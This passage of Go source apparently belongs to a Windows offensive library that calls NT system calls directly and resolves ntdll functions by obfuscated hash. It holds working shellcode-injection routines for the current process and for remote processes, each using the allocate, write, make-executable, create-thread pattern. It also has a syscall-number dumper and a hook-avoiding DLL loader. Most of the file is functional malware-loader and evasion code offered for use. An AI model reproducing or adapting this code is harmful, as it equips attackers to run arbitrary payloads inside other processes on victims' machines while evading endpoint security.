	return DirectSyscall("NtSetInformationThread",
		threadHandle,
		threadInformationClass,
		uintptr(threadInformation),
		threadInformationLength)
}

// NtQueryInformationThread queries information about a thread
func NtQueryInformationThread(threadHandle uintptr, threadInformationClass uintptr, threadInformation unsafe.Pointer, threadInformationLength uintptr, returnLength *uintptr) (uintptr, error) {
	return DirectSyscall("NtQueryInformationThread",
		threadHandle,
		threadInformationClass,
		uintptr(threadInformation),
		threadInformationLength,
		uintptr(unsafe.Pointer(returnLength)))
}

// NtFlushInstructionCache flushes the instruction cache for the specified process
// This is critical for code injection scenarios to ensure cache coherency
func NtFlushInstructionCache(processHandle uintptr, baseAddress uintptr, size uintptr) (uintptr, error) {
	return DirectSyscall("NtFlushInstructionCache",
		processHandle,
		baseAddress,
		size)
}

// NtSetEventBoostPriority temporarily boosts the priority of waiting threads
func NtSetEventBoostPriority(eventHandle uintptr) (uintptr, error) {
	return DirectSyscall("NtSetEventBoostPriority",
		eventHandle)
}

// NtQueryPerformanceCounter queries the performance counter
func NtQueryPerformanceCounter(performanceCounter *uint64, performanceFrequency *uint64) (uintptr, error) {
	return DirectSyscall("NtQueryPerformanceCounter",
		uintptr(unsafe.Pointer(performanceCounter)),
		uintptr(unsafe.Pointer(performanceFrequency)))
}

// NtOpenThreadTokenEx opens the access token associated with a thread with extended parameters
func NtOpenThreadTokenEx(threadHandle uintptr, desiredAccess uintptr, openAsSelf bool, handleAttributes uintptr, tokenHandle *uintptr) (uintptr, error) {
	openSelf := uintptr(0)
	if openAsSelf {
		openSelf = 1
	}
	return DirectSyscall("NtOpenThreadTokenEx",
		threadHandle,
		desiredAccess,
		openSelf,
		handleAttributes,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// NtOpenProcessTokenEx opens the access token associated with a process with extended parameters
func NtOpenProcessTokenEx(processHandle uintptr, desiredAccess uintptr, handleAttributes uintptr, tokenHandle *uintptr) (uintptr, error) {
	return DirectSyscall("NtOpenProcessTokenEx",
		processHandle,
		desiredAccess,
		handleAttributes,
		uintptr(unsafe.Pointer(tokenHandle)))
}

// SyscallInfo holds information about a single syscall
type SyscallInfo struct {
	Name          string
	Hash          uint32
	SyscallNumber uint16
	Address       uintptr
}

// DumpAllSyscalls enumerates all syscall functions from ntdll.dll and returns their information
// This function uses the same logic as the existing pkg modules to discover and resolve syscalls
func DumpAllSyscalls() ([]SyscallInfo, error) {
	debug.Printfln("WINAPI", "Starting syscall enumeration...\n")
	
	// Get the base address of ntdll.dll using the same logic as GetSyscallNumber
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return nil, fmt.Errorf("failed to get ntdll.dll base address")
	}
	
	debug.Printfln("WINAPI", "Found ntdll.dll at: 0x%X\n", ntdllBase)
	
	// Parse the PE file to get all exports (similar to GetFunctionAddress logic)
	// Read the PE header to get the actual size of the image
	dosHeader := (*[64]byte)(unsafe.Pointer(ntdllBase))
	if dosHeader[0] != 'M' || dosHeader[1] != 'Z' {
		return nil, fmt.Errorf("invalid DOS signature")
	}
	
	// Get the offset to the PE header
	peOffset := *(*uint32)(unsafe.Pointer(ntdllBase + 60))
	if peOffset >= 1024 {
		return nil, fmt.Errorf("PE offset too large: %d", peOffset)
	}
	
	// Read the PE header to get the SizeOfImage
	peHeader := (*[1024]byte)(unsafe.Pointer(ntdllBase + uintptr(peOffset)))
	if peHeader[0] != 'P' || peHeader[1] != 'E' {
		return nil, fmt.Errorf("invalid PE signature")
	}
	
	// SizeOfImage is at offset 56 from the start of the OptionalHeader
	// OptionalHeader starts at offset 24 from PE signature
	sizeOfImage := *(*uint32)(unsafe.Pointer(ntdllBase + uintptr(peOffset) + 24 + 56))
	
	debug.Printfln("WINAPI", "PE SizeOfImage: %d bytes\n", sizeOfImage)
	
	// Create a memory reader for the PE file with the correct size
	dataSlice := unsafe.Slice((*byte)(unsafe.Pointer(ntdllBase)), sizeOfImage)
	
	// Parse the PE file from memory using the same memoryReaderAt approach
	memReader := &memoryReaderAt{data: dataSlice}
	
	// Use the debug/pe package to parse the file
	file, err := pe.NewFileFromMemory(memReader)
	if err != nil {
		return nil, fmt.Errorf("failed to parse PE file: %v", err)
	}
	defer file.Close()
	
	// Get all exports
	exports, err := file.Exports()
	if err != nil {
		return nil, fmt.Errorf("failed to get exports: %v", err)
	}
	
	debug.Printfln("WINAPI", "Found %d exports in ntdll.dll\n", len(exports))
	
	var syscalls []SyscallInfo
	
	// Filter for syscall functions (those that start with "Nt" or "Zw")
	for _, export := range exports {
		if export.Name == "" {
			continue
		}
		
		// Check if this is a syscall function (starts with Nt or Zw)
		if !(len(export.Name) > 2 && (export.Name[:2] == "Nt" || export.Name[:2] == "Zw")) {
			continue
		}
		
		// Get function address
		funcAddr := ntdllBase + uintptr(export.VirtualAddress)
		
		// Calculate hash using the same obfuscation logic
		funcHash := obf.GetHash(export.Name)
		
		// Try to extract syscall number
		// The syscall number is at offset 4 in the syscall stub for x64
		// The typical pattern is:
		// 0:  4c 8b d1             mov    r10,rcx
		// 3:  b8 XX XX 00 00       mov    eax,0xXXXX  <-- syscall number is here
		// We need to check if this is actually a syscall stub
		
		var syscallNumber uint16
		
		// Check if the function starts with the expected syscall stub pattern
		if funcAddr != 0 {
			// Read first few bytes to check if it's a syscall stub
			firstBytes := make([]byte, 16)
			for i := 0; i < 16; i++ {
				firstBytes[i] = *(*byte)(unsafe.Pointer(funcAddr + uintptr(i)))
			}
			
			// Check for typical syscall stub pattern: 4c 8b d1 b8 (mov r10,rcx; mov eax,XXXX)
			if len(firstBytes) >= 8 && firstBytes[0] == 0x4c && firstBytes[1] == 0x8b && 
			   firstBytes[2] == 0xd1 && firstBytes[3] == 0xb8 {
				// Extract syscall number (little endian uint16 at offset 4)
				syscallNumber = *(*uint16)(unsafe.Pointer(funcAddr + 4))
			}
		}
		
		// Only include functions that have valid syscall numbers
		if syscallNumber > 0 {
			syscallInfo := SyscallInfo{
				Name:          export.Name,
				Hash:          funcHash,
				SyscallNumber: syscallNumber,
				Address:       funcAddr,
			}
			syscalls = append(syscalls, syscallInfo)
		}
	}
	
	debug.Printfln("WINAPI", "Found %d syscall functions\n", len(syscalls))
	
	return syscalls, nil
}

// DumpAllSyscallsWithFiles enumerates all syscall functions and exports to both JSON and Go files
// This is the enhanced version that generates both JSON and Go syscall table files
func DumpAllSyscallsWithFiles() ([]SyscallInfo, error) {
	// Get the syscall information using the existing function
	syscalls, err := DumpAllSyscalls()
	if err != nil {
		return nil, err
	}

	// Generate Go syscall table file
	err = generateSyscallTableFile(syscalls)
	if err != nil {
		fmt.Printf("Warning: Failed to generate Go syscall table: %v\n", err)
	}

	return syscalls, nil
}

// generateSyscallTableFile creates a Go file with syscall table map
func generateSyscallTableFile(syscalls []SyscallInfo) error {
	// Create a map to store unique syscall entries (prefer Nt over Zw functions)
	syscallMap := make(map[string]uint16)
	
	// First pass: add all Nt functions
	for _, sc := range syscalls {
		if len(sc.Name) > 2 && sc.Name[:2] == "Nt" {
			syscallMap[sc.Name] = sc.SyscallNumber
		}
	}
	
	// Second pass: add Zw functions only if no corresponding Nt function exists
	for _, sc := range syscalls {
		if len(sc.Name) > 2 && sc.Name[:2] == "Zw" {
			// Convert Zw name to Nt equivalent
			ntName := "Nt" + sc.Name[2:]
			if _, exists := syscallMap[ntName]; !exists {
				// No Nt equivalent exists, add the Zw function
				syscallMap[sc.Name] = sc.SyscallNumber
			}
		}
	}

	// Generate filename with timestamp
	now := time.Now()
	timestamp := fmt.Sprintf("%d%02d%02d_%02d%02d%02d", 
		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
	filename := fmt.Sprintf("syscall_table_%s.go", timestamp)

	// Create the Go file content
	content := `// Package syscalltable provides pre-computed syscall numbers
// Auto-generated by go-direct-syscall DumpAllSyscalls function
// WARNING: These syscall numbers are specific to this Windows version
package syscalltable

// SyscallTable contains pre-computed syscall numbers for Windows NT functions
// Key: Function name, Value: Syscall number (SSN)
var SyscallTable = map[string]uint16{
`

	// Sort the functions for consistent output
	var sortedNames []string
	for name := range syscallMap {
		sortedNames = append(sortedNames, name)
	}
	
	// Simple sorting (bubble sort for simplicity)
	for i := 0; i < len(sortedNames)-1; i++ {
		for j := 0; j < len(sortedNames)-i-1; j++ {
			if sortedNames[j] > sortedNames[j+1] {
				sortedNames[j], sortedNames[j+1] = sortedNames[j+1], sortedNames[j]
			}
		}
	}

	// Add each syscall to the map
	for _, name := range sortedNames {
		ssn := syscallMap[name]
		content += fmt.Sprintf("\t\"%s\": %d,\n", name, ssn)
	}

	content += `}

// GetSyscallNumber returns the syscall number for a given function name
// Returns 0 if the function is not found in the table
func GetSyscallNumber(functionName string) uint16 {
	if ssn, exists := SyscallTable[functionName]; exists {
		return ssn
	}
	return 0
}

// GetAllSyscalls returns a copy of the complete syscall table
func GetAllSyscalls() map[string]uint16 {
	result := make(map[string]uint16)
	for name, ssn := range SyscallTable {
		result[name] = ssn
	}
	return result
}

// GetSyscallCount returns the total number of syscalls in the table
func GetSyscallCount() int {
	return len(SyscallTable)
}
`

	// Write the Go file
	err := writeFileContent(filename, []byte(content))
	if err != nil {
		return fmt.Errorf("failed to write Go syscall table file: %v", err)
	}

	debug.Printfln("WINAPI", "Generated Go syscall table: %s\n", filename)
	debug.Printfln("WINAPI", "Syscall table contains %d unique functions\n", len(syscallMap))
	
	return nil
}

// writeFileContent writes content to a file (helper function)
func writeFileContent(filename string, content []byte) error {
	return os.WriteFile(filename, content, 0644)
}

// memoryReaderAt implements io.ReaderAt for in-memory data (copied from syscallresolve logic)
type memoryReaderAt struct {
	data []byte
}

func (r *memoryReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
	if off < 0 || off >= int64(len(r.data)) {
		return 0, fmt.Errorf("offset out of range")
	}
	n = copy(p, r.data[off:])
	if n < len(p) {
		err = fmt.Errorf("EOF")
	}
	return n, err
}

/*
PROBLEM:
Go's garbage collector allocates byte slices in virtual memory regions that
Windows NT syscalls (specifically NtWriteVirtualMemory) sometimes refuse to
read from, causing intermittent STATUS_INVALID_PARAMETER (0x8000000D) errors.
The same shellcode payload may work on one run and fail on the next, depending
on where Go places it in memory.

SOLUTION:
1. First attempt: Allocate "syscall-friendly" memory using NtAllocateVirtualMemory
2. Copy shellcode from Go memory → Windows-allocated memory  
3. Execute injection using the Windows-allocated copy
4. Fallback: If Windows allocation fails, use original Go memory method
5. Always cleanup allocated memory

This pattern achieves 100% reliability (in my testing) by ensuring the source memory is always
in a region that Windows syscalls can read from, while maintaining backward
compatibility through the fallback mechanism.

NOTE: OriginalNtInjectSelfShellcode() contains the original implementation without
the memory compatibility layer, used as the fallback method.
*/
func NtInjectSelfShellcode(shellcode []byte) error {
	time.Sleep(1 * time.Second)
	
	// Debug: Check if shellcode pointer is valid
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}
	
	debug.Printfln("WINAPI", "Debug: Shellcode length: %d, first byte: 0x%02X, ptr: %p\n", 
		len(shellcode), shellcode[0], &shellcode[0])
	
	// First attempt: Try direct injection with original Go memory
	debug.Printfln("WINAPI", "Attempting direct injection with Go memory\n")
	result := OriginalNtInjectSelfShellcode(shellcode)
	
	// If direct injection succeeded, we're done
	if result == nil {
		debug.Printfln("WINAPI", "Direct injection succeeded!\n")
		return nil
	}
	
	// Fallback: Use "safe memory" workaround for compatibility
	debug.Printfln("WINAPI", "Direct injection failed (%v), trying safe memory fallback\n", result)
	
	currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
	var sourceAddress uintptr
	size := uintptr(len(shellcode))
	
	status, err := NtAllocateVirtualMemory(
		currentProcess,
		&sourceAddress,
		0,
		&size,
		0x1000|0x2000, // MEM_COMMIT|MEM_RESERVE
		0x04,          // PAGE_READWRITE
	)
	
	if err != nil || status != 0 {
		debug.Printfln("WINAPI", "Failed to allocate safe source memory: %v\n", err)
		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
	}
	
	// Copy shellcode to safe memory region
	var bytesWritten uintptr
	writeStatus, writeErr := NtWriteVirtualMemory(
		currentProcess,
		sourceAddress,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	
	if writeErr != nil || writeStatus != 0 || bytesWritten != uintptr(len(shellcode)) {
		debug.Printfln("WINAPI", "Failed to copy to safe memory: %v\n", writeErr)
		// Cleanup and return original error
		NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
		return fmt.Errorf("both direct injection and safe memory fallback failed: %v", result)
	}
	
	// Create byte slice pointing to safe memory and try injection again
	safeShellcode := (*[1 << 30]byte)(unsafe.Pointer(sourceAddress))[:len(shellcode):len(shellcode)]
	debug.Printfln("WINAPI", "Using safe memory fallback at: %p\n", unsafe.Pointer(sourceAddress))
	
	result = OriginalNtInjectSelfShellcode(safeShellcode)
	
	// Cleanup safe memory
	NtFreeVirtualMemory(currentProcess, &sourceAddress, &size, 0x8000)
	
	if result != nil {
		debug.Printfln("WINAPI", "Safe memory fallback also failed: %v\n", result)
		return fmt.Errorf("all injection methods failed: %v", result)
	}
	
	debug.Printfln("WINAPI", "Safe memory fallback succeeded!\n")
	return nil
}

func OriginalNtInjectSelfShellcode(payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("payload is empty")
	}
	currentProcess := ^uintptr(0) // Use pseudo-handle for current process

	// Step 1: Allocate RW memory
	var baseAddress uintptr
	size := uintptr(len(payload))

	status, err := NtAllocateVirtualMemory(
		currentProcess,
		&baseAddress,
		0,
		&size,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
	}

	// Step 2: Write shellcode using NtWriteVirtualMemory (safer than unsafe copy)
	var bytesWritten uintptr
	status, err = NtWriteVirtualMemory(
		currentProcess,
		baseAddress,
		unsafe.Pointer(&payload[0]),
		uintptr(len(payload)),
		&bytesWritten,
	)
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("write failed: %v %s", err, FormatNTStatus(status))
	}
	if bytesWritten != uintptr(len(payload)) {
		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
	}
	debug.Printfln("WINAPI", "Wrote %d bytes to self process\n", bytesWritten)

	// Step 3: Change protection to RX
	var oldProtect uintptr
	status, err = NtProtectVirtualMemory(
		currentProcess,
		&baseAddress,
		&size,
		PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("protect failed: %v %s", err, FormatNTStatus(status))
	}

	// Step 4: Create thread using NtCreateThreadEx (true direct syscall)
	var hThread uintptr
	
	// NtCreateThreadEx parameters:
	// threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, arg, 
	// createFlags, zeroBits, stackSize, maximumStackSize, attributeList
	status, err = NtCreateThreadEx(
		&hThread,                    // threadHandle - pointer to receive handle
		THREAD_ALL_ACCESS,           // desiredAccess - full access to thread
		0,                           // objectAttributes - NULL for basic usage
		currentProcess,              // processHandle - current process pseudo-handle
		baseAddress,                 // startAddress - our shellcode address
		0,                           // arg - no parameter to pass
		0,                           // createFlags - 0 = run immediately, 1 = create suspended
		0,                           // zeroBits - 0 for default
		0,                           // stackSize - 0 for default
		0,                           // maximumStackSize - 0 for default
		0,                           // attributeList - NULL for basic usage
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("NtCreateThreadEx failed: %v %s", err, FormatNTStatus(status))
	}

	debug.Printfln("WINAPI", "Thread created successfully: 0x%X\n", hThread)
	
	// Wait for thread to complete execution
	debug.Printfln("WINAPI", "Waiting for thread to complete...\n")
	
	// Wait for the thread with a timeout (10 seconds to be safe)
	timeout := uint64(10000 * 1000 * 10) // 10 seconds in 100ns units
	waitStatus, err := NtWaitForSingleObject(hThread, false, &timeout)
	if err != nil {
		debug.Printfln("WINAPI", "Warning: Wait failed: %v\n", err)
	} else {
		debug.Printfln("WINAPI", "Thread wait completed with status: %s\n", FormatNTStatus(waitStatus))
	}
	
	// Give it a moment and then clean up
	time.Sleep(1 * time.Second)
	
	// Close the thread handle
	closeStatus, err := NtClose(hThread)
	if err != nil || closeStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
	} else {
		debug.Printfln("WINAPI", "Thread handle closed successfully\n")
	}
	return nil
}

// NtInjectRemote injects shellcode into a remote process using direct syscalls ONLY
// This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
// processHandle: Handle to the target process (must have PROCESS_ALL_ACCESS or appropriate rights)
// payload: The shellcode bytes to inject
func NtInjectRemote(processHandle uintptr, payload []byte) error {
	if len(payload) == 0 {
		return fmt.Errorf("payload is empty")
	}
	if processHandle == 0 {
		return fmt.Errorf("invalid process handle")
	}

	debug.Printfln("WINAPI", "Starting remote injection into process handle 0x%X (%d bytes)\n", processHandle, len(payload))

	// Step 1: Allocate RW memory in remote process (same pattern as self-injection)
	var remoteBuffer uintptr
	allocSize := uintptr(len(payload))
	
	status, err := NtAllocateVirtualMemory(
		processHandle,
		&remoteBuffer,
		0,
		&allocSize,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)
	
	if err != nil {
		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		return fmt.Errorf("NtAllocateVirtualMemory failed: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI", "Allocated %d bytes at 0x%X\n", allocSize, remoteBuffer)

	// Step 2: Write shellcode to remote memory
	var bytesWritten uintptr
	
	status, err = NtWriteVirtualMemory(
		processHandle,
		remoteBuffer,
		unsafe.Pointer(&payload[0]),
		uintptr(len(payload)),
		&bytesWritten,
	)
	
	if err != nil {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtWriteVirtualMemory failed: %s", FormatNTStatus(status))
	}
	
	if bytesWritten != uintptr(len(payload)) {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
	}
	
	debug.Printfln("WINAPI", "Wrote %d bytes successfully\n", bytesWritten)

	// Step 3: Change protection to RX (same as self-injection pattern)
	var oldProtect uintptr
	protectSize := uintptr(len(payload))
	
	status, err = NtProtectVirtualMemory(
		processHandle,
		&remoteBuffer,
		&protectSize,
		PAGE_EXECUTE_READ,
		&oldProtect,
	)
	
	if err != nil {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtProtectVirtualMemory error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtProtectVirtualMemory failed: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI", "Changed memory protection to RX\n")

	// Step 4: Create remote thread using NtCreateThreadEx 
	var hThread uintptr
	
	status, err = NtCreateThreadEx(
		&hThread,             // threadHandle - pointer to receive handle
		THREAD_ALL_ACCESS,    // desiredAccess - full access to thread
		0,                    // objectAttributes - NULL for basic usage
		processHandle,        // processHandle - target process handle
		remoteBuffer,         // startAddress - our shellcode address
		0,                    // arg - no parameter to pass
		0,                    // createFlags - 0 = run immediately (like working example)
		0,                    // zeroBits - 0 for default
		0,                    // stackSize - 0 for default
		0,                    // maximumStackSize - 0 for default
		0,                    // attributeList - NULL for basic usage
	)
	
	if err != nil {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		// Cleanup on failure
		freeSize := uintptr(0)
		NtFreeVirtualMemory(processHandle, &remoteBuffer, &freeSize, MEM_RELEASE)
		return fmt.Errorf("NtCreateThreadEx failed: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI", "Created remote thread: 0x%X\n", hThread)

	// Step 5: Close thread handle immediately 
	closeStatus, err := NtClose(hThread)
	if err != nil || closeStatus != STATUS_SUCCESS {
		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
	} else {
		debug.Printfln("WINAPI", "Thread handle closed successfully\n")
	}
	
	debug.Printfln("WINAPI", "Remote thread created and running - not waiting for completion\n")

	return nil
}

// Additional structures needed for LdrLoadDll and LdrGetProcedureAddress

type ANSI_STRING struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *byte
}

// LdrLoadDll loads a DLL into the current process
// This is the NT equivalent of LoadLibrary
func LdrLoadDll(pathToFile *uint16, flags uintptr, moduleName *UNICODE_STRING, moduleHandle *uintptr) (uintptr, error) {
	// Get function address from ntdll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return 0, fmt.Errorf("failed to get ntdll.dll base")
	}
	debug.Printfln("WINAPI", "Found ntdll.dll at 0x%X\n", ntdllBase)
	
	funcHash := obf.GetHash("LdrLoadDll")
	funcAddr := syscallresolve.GetFunctionAddress(ntdllBase, funcHash)
	if funcAddr == 0 {
		return 0, fmt.Errorf("failed to get LdrLoadDll address")
	}
	debug.Printfln("WINAPI", "Found LdrLoadDll at 0x%X\n", funcAddr)
	
	// Call with proper stack handling
	return DirectCallWithStack(funcAddr,
		uintptr(unsafe.Pointer(pathToFile)),
		flags,
		uintptr(unsafe.Pointer(moduleName)),
		uintptr(unsafe.Pointer(moduleHandle)))
}



// LoadDllInternal is the internal implementation of LoadDll
func LoadDllInternal(dllPath string, basicLoad bool) (uintptr, error) {
	// Lock thread early
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Extract just the DLL name for system DLLs
	dllName := dllPath
	if strings.Contains(dllPath, "\\") {
		parts := strings.Split(dllPath, "\\")
		dllName = parts[len(parts)-1]
	}
	debug.Printfln("WINAPI", "Loading DLL: %s (basic=%v)\n", dllName, basicLoad)

	// Allocate all memory upfront to prevent GC movement
	type CallContext struct {
		nameBuffer []uint16
		us        UNICODE_STRING
		handle    uintptr
		flags     uint32        // Actual flags value
		args      [4]uintptr    // Arguments for the call
	}
	
	// Allocate context on heap to prevent stack movement
	ctx := new(CallContext)
	
	// Allocate aligned buffer for DLL name
	bufSize := (len(dllName) + 1) * 2 // UTF-16 + null terminator
	alignedSize := (bufSize + 15) &^ 15 // Round up to nearest 16
	ctx.nameBuffer = make([]uint16, alignedSize/2)

	// Convert to UTF-16 with proper null termination
	for i := 0; i < len(dllName); i++ {
		ctx.nameBuffer[i] = uint16(dllName[i])
	}
	ctx.nameBuffer[len(dllName)] = 0
	
	// Calculate actual UTF-16 length in bytes
	nameLen := uint16(len(dllName) * 2)
	
	// Set up UNICODE_STRING
	ctx.us = UNICODE_STRING{
		Length:        nameLen,
		MaximumLength: nameLen + 2,
		Buffer:        &ctx.nameBuffer[0],
	}
	
	// Debug print the structures
	debug.Printfln("WINAPI", "UNICODE_STRING: len=%d maxlen=%d buf=%X\n",
		ctx.us.Length, ctx.us.MaximumLength, uintptr(unsafe.Pointer(ctx.us.Buffer)))
	
	// Get ntdll base and function
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return 0, fmt.Errorf("failed to get ntdll.dll base")
	}
	
	funcHash := obf.GetHash("LdrLoadDll")
	funcAddr := syscallresolve.GetFunctionAddress(ntdllBase, funcHash)
	if funcAddr == 0 {
		return 0, fmt.Errorf("failed to get LdrLoadDll address")
	}
	
	// Set up flags - now as a value in the context
	if basicLoad {
		ctx.flags = 0x00000008 // DONT_RESOLVE_DLL_REFERENCES
	}
	
	// Prepare arguments - note flags is now a pointer
	ctx.args[0] = 0 // PathToFile (NULL)
	ctx.args[1] = uintptr(unsafe.Pointer(&ctx.flags)) // Flags as pointer
	ctx.args[2] = uintptr(unsafe.Pointer(&ctx.us))    // ModuleFileName
	ctx.args[3] = uintptr(unsafe.Pointer(&ctx.handle)) // BaseAddress
	
	// Debug print arguments
	debug.Printfln("WINAPI", "Calling LdrLoadDll with:\n")
	debug.Printfln("WINAPI", "  PathToFile: NULL\n")
	debug.Printfln("WINAPI", "  Flags: ptr=%X value=%X\n", 
		ctx.args[1], ctx.flags)
	debug.Printfln("WINAPI", "  ModuleFileName: ptr=%X\n", ctx.args[2])
	debug.Printfln("WINAPI", "  BaseAddress: ptr=%X\n", ctx.args[3])
	
	// Keep everything alive
	runtime.KeepAlive(ctx)
	
	// Make the call
	status, err := DirectCallWithStack(funcAddr, ctx.args[:]...)
	
	// Keep alive after call
	runtime.KeepAlive(ctx)
	
	if err != nil {
		return 0, fmt.Errorf("LdrLoadDll failed with error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		return 0, fmt.Errorf("LdrLoadDll failed with status: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI", "Successfully loaded DLL, handle: 0x%X\n", ctx.handle)
	return ctx.handle, nil
}

// LdrGetProcedureAddress gets the address of an exported function from a loaded module
// This is the NT equivalent of GetProcAddress
func LdrGetProcedureAddress(moduleHandle uintptr, functionName *ANSI_STRING, ordinal uint16, functionAddress *uintptr) (uintptr, error) {
	// Get function address from ntdll
	ntdllHash := obf.GetHash("ntdll.dll")
	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
	if ntdllBase == 0 {
		return 0, fmt.Errorf("failed to get ntdll.dll base")
	}
	debug.Printfln("WINAPI", "Found ntdll.dll at 0x%X\n", ntdllBase)
	
	funcHash := obf.GetHash("LdrGetProcedureAddress")
	funcAddr := syscallresolve.GetFunctionAddress(ntdllBase, funcHash)
	if funcAddr == 0 {
		return 0, fmt.Errorf("failed to get LdrGetProcedureAddress address")
	}
	debug.Printfln("WINAPI", "Found LdrGetProcedureAddress at 0x%X\n", funcAddr)
	
	// Print parameters for debugging
	debug.Printfln("WINAPI", "ModuleHandle: 0x%X\n", moduleHandle)
	if functionName != nil {
		debug.Printfln("WINAPI", "FunctionName: len=%d maxlen=%d buf=%X\n",
			functionName.Length, functionName.MaximumLength, uintptr(unsafe.Pointer(functionName.Buffer)))
	}
	debug.Printfln("WINAPI", "Ordinal: %d\n", ordinal)
	debug.Printfln("WINAPI", "FunctionAddress ptr: %X\n", uintptr(unsafe.Pointer(functionAddress)))
	
	// Ensure proper stack alignment and shadow space for x64 calling convention
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	
	result, err := DirectCall(funcAddr,
		moduleHandle,
		uintptr(unsafe.Pointer(functionName)),
		uintptr(ordinal),
		uintptr(unsafe.Pointer(functionAddress)))
	
	debug.Printfln("WINAPI", "LdrGetProcedureAddress result: status=%X err=%v\n", result, err)
	return result, err
}

// Helper function to create an ANSI_STRING from a Go string
func NewAnsiString(s string) *ANSI_STRING {
	if s == "" {
		return &ANSI_STRING{}
	}
	
	// Allocate buffer for ANSI string (including null terminator)
	buffer := make([]byte, len(s)+1)
	
	// Copy string bytes
	copy(buffer, s)
	
	// Add null terminator
	buffer[len(s)] = 0
	
	return &ANSI_STRING{
		Length:        uint16(len(s)),
		MaximumLength: uint16(len(s) + 1),
		Buffer:        &buffer[0],
	}
}

// GetProcAddress is a high-level wrapper around LdrGetProcedureAddress that handles string conversion
func GetProcAddress(moduleHandle uintptr, functionName string) (uintptr, error) {
	debug.Printfln("WINAPI", "Getting procedure address for %s from module 0x%X\n", functionName, moduleHandle)
	
	// Convert function name to ANSI_STRING and ensure it stays in memory
	ansiBytes := []byte(functionName + "\x00")
	ansiName := ANSI_STRING{
		Length:        uint16(len(functionName)),
		MaximumLength: uint16(len(functionName) + 1),
		Buffer:        &ansiBytes[0],
	}
	
	debug.Printfln("WINAPI", "Created ANSI_STRING: len=%d maxlen=%d buf=%X content=%v\n",
		ansiName.Length, ansiName.MaximumLength, uintptr(unsafe.Pointer(ansiName.Buffer)), ansiBytes)
	
	// Keep the buffer alive until LdrGetProcedureAddress completes
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	
	var functionAddress uintptr
	status, err := LdrGetProcedureAddress(
		moduleHandle,
		&ansiName,
		0,              // Ordinal (0 when using function name)
		&functionAddress,
	)
	
	if err != nil {
		return 0, fmt.Errorf("LdrGetProcedureAddress failed with error: %v", err)
	}
	
	if status != STATUS_SUCCESS {
		return 0, fmt.Errorf("LdrGetProcedureAddress failed with status: %s", FormatNTStatus(status))
	}
	
	debug.Printfln("WINAPI", "Successfully resolved %s to 0x%X\n", functionName, functionAddress)
	return functionAddress, nil
}




